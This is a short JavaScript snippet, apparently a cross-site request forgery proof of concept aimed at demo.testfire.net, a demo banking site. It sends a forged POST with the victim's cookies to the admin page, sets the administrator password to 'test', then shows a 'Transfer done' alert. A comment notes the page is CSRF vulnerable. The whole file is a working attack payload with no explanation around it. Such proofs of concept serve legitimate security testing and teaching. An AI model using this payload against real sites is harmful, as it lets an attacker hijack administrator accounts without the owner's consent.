fetch("https://demo.testfire.net/admin/admin.jsp", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en,en-US;q=0.9",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "https://demo.testfire.net/admin/admin.jsp",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "username=admin&password1=test&password2=test&change=Change+Password",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}).then(()=>{
    
    alert("Transfer done")
});
// alert("CSRF vulnerable");
